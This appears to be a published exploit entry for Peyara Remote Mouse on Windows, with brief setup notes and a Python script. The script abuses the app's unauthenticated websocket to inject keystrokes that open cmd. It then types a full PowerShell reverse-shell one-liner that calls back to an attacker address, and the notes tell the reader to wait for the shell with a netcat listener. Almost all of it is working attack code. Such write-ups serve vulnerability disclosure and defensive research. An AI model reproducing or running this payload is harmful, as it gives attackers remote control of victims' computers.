# Exploit Title: Peyara Remote Mouse v2.0.0- Remote Code Execution (RCE) 
# Date: 2025-05-30
# Exploit Author: tmrswrr
# Software Link: https://peyara-remote-mouse.vercel.app/
# Platform: Windows
# Version: v1.0.1
# Tested on: Windows 10

"""Remote Access Setup Procedure:

    Install Peyara Remote Mouse

        Download and install the Peyara Remote Mouse application on the Windows target system.

    Configure Netcat Listener

        Open a terminal and execute the following command to start a Netcat listener on port 4444:
        sh

    nc -nlvp 4444

Execute Exploit Script

    Run the provided script to establish a reverse shell connection. Upon successful execution, you will gain remote access to the target system"""

#!/usr/bin/env python3
import asyncio
import websockets
import json

async def main():
    uri = "ws://192.168.1.107:1313/socket.io/?EIO=4&transport=websocket"
    async with websockets.connect(uri) as ws:

        # Engine.IO 'open' paketi
        open_frame = await ws.recv()
        print("[<] OPEN     ", open_frame)

        # Namespace connect
        await ws.send("40")
        ns_ack = await ws.recv()
        print("[<] NAMESPACE", ns_ack)

        # İlk ping/pong
        frame = await ws.recv()
        print("[<] FRAME    ", frame)
        if frame == "2":
            await ws.send("3")
            print("[>] PONG     3")
        
        # Küçük gecikme ekle
        await asyncio.sleep(1)

        # Ctrl+Esc komutunu gönder
        ctrl_esc_event = '42["edit-key",{"key":"escape","modifier":["control"]}]'
        await ws.send(ctrl_esc_event)
        print("[>] Ctrl+Esc EVENT SENT:", ctrl_esc_event)
        await asyncio.sleep(0.5)  # Uygulamanın tepki vermesi için bekle
        
        # CMD'yi açmak için komutları gönder (aralara gecikmeler ekle)
        await ws.send('42["key","c"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","m"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","d"]')
        await asyncio.sleep(0.2)
        await ws.send('42["key","enter"]')
        await asyncio.sleep(1)  # CMD'nin açılması için daha uzun bekle
        
        await ws.send('42["key","enter"]')  # Boş satır için
        await asyncio.sleep(0.5)
        
        # PowerShell komutunu gönder
        ps_command = r'''powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('192.168.1.110',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=iex $d 2>&1;$s.Write((New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($r + 'PS > '),0,($r + 'PS > ').Length)}"'''
        payload = '42' + json.dumps(["key", ps_command])
        await ws.send(payload)
        print("[>] PowerShell command sent")
        
        # Komutun yürütülmesi için biraz daha bekle
        await asyncio.sleep(4)
        await ws.send('42["key","enter"]')  # Boş satır için
        await asyncio.sleep(0.5)
        
        # Ping'lere cevap verme döngüsü
        while True:
            try:
                frame = await ws.recv()
                print("[<] FRAME    ", frame)
                
                if frame == "2":  # Ping geldiğinde
                    await ws.send("3")
                    print("[>] PONG     3")
                    
                if frame.startswith("341"):  # Namespace disconnect
                    print("[*] Namespace disconnect görüldü, çıkılıyor.")
                    break
                    
            except websockets.ConnectionClosed:
                print("[*] WebSocket bağlantısı kapandı")
                break

    print("[*] İşlem tamamlandı.")

if __name__ == "__main__":
    asyncio.run(main())
